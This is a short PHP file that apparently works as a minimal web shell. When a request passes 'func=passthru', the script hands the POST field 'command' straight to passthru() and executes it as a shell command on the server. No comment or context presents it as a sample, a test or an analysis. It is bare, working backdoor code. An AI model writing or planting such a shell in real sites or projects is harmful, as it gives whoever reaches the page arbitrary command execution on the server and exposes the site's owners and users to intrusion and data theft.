<?php
$execfunc = $_GET['func'];
if  ($_POST['command'] )  {
	if ($execfunc=="passthru") {
		passthru($_POST['command']);
	}
}
?>